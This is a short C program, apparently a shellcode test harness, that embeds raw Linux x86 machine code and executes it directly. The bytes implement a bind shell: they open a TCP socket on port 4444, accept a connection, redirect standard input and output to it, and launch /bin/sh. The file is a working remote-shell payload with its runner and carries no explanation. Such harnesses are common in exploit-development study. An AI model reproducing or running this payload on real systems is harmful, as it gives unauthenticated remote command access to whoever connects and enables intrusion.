#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\x89\xca\x83\xea\x01\xcd\x80\x96\x31\xd2\x52\x66\x68\x11\x5c\x66\x6a\x02\x66\xb8\x69\x01\x89\xf3\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31\xc9\x31\xd2\x56\x31\xf6\xcd\x80\x5e\x89\xc7\xb0\x3f\x89\xfb\xb1\x02\xcd\x80\x49\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
